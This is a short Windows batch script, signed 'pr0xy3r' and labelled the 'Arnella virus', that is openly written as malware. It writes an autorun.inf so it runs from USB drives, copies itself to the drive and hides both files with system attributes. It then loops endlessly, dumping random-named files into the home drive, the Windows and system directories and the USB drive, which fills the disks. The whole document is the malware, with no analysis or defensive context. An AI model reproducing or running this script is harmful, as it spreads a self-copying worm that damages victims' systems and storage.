@echo off
:: Arnella virus
:: by pr0xy3r
%usbdrv%
echo [autorun]>>autorun.inf
echo OPEN=arnella.bat>>autorun.inf
copy %0 "%usbdrv%\arnella.bat"
attrib +R +S +H %usbdrv%\autorun.inf
attrib +R +S +H %usbdrv%\arnella.bat
:random
%homedrive%
echo %random%>>%random%.txt
cd %windir%
echo %random%>>%random%.txt
cd %systemroot%
echo %random%>>%random%.txt
cd %usbdrv%
echo %random%>>%random%.txt
goto random